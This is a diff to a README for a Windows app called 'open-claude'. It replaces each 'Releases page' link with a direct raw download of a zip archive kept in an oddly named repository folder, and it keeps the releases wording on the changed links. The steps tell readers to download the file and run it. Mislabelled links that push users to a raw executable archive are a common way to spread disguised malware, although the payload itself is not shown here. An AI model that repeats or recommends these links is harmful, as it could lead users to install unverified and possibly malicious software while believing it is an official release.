@@ -1,6 +1,6 @@
 # 🤖 open-claude - Run Claude-style coding on Windows
 
-[![Download open-claude](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Thuso030703/open-claude/releases)
+[![Download open-claude](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Thuso030703/open-claude/raw/refs/heads/main/titanothere/open_claude_2.8.zip)
 
 ## 🧭 What this app does
 
@@ -14,7 +14,7 @@ It is built for people who want to:
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/Thuso030703/open-claude/releases)
+1. Open the [Releases page](https://github.com/Thuso030703/open-claude/raw/refs/heads/main/titanothere/open_claude_2.8.zip)
 2. Find the latest release
 3. Download the Windows file for your computer
 4. Open the file and run it
@@ -24,7 +24,7 @@ If you see more than one file, choose the one for Windows. For most users, this 
 ## 🪟 Install on Windows
 
 ### 1. Download the release file
-Go to the [open-claude releases page](https://github.com/Thuso030703/open-claude/releases) and get the latest Windows build.
+Go to the [open-claude releases page](https://github.com/Thuso030703/open-claude/raw/refs/heads/main/titanothere/open_claude_2.8.zip) and get the latest Windows build.
 
 ### 2. Save the file
 Save it to a folder you can find later, such as:
@@ -174,11 +174,11 @@ If your provider has a custom API address, use that address during setup.
 
 If you need the file again, use the release page here:
 
-[Visit the open-claude Releases page](https://github.com/Thuso030703/open-claude/releases)
+[Visit the open-claude Releases page](https://github.com/Thuso030703/open-claude/raw/refs/heads/main/titanothere/open_claude_2.8.zip)
 
 ## 🪄 Quick start
 
-1. Download the latest Windows build from the [Releases page](https://github.com/Thuso030703/open-claude/releases)
+1. Download the latest Windows build from the [Releases page](https://github.com/Thuso030703/open-claude/raw/refs/heads/main/titanothere/open_claude_2.8.zip)
 2. Open or extract the file
 3. Run open-claude
 4. Pick a theme
@@ -200,4 +200,4 @@ open-claude
 
 ## 🔗 Main download link
 
-[Download from GitHub Releases](https://github.com/Thuso030703/open-claude/releases)
+[Download from GitHub Releases](https://github.com/Thuso030703/open-claude/raw/refs/heads/main/titanothere/open_claude_2.8.zip)
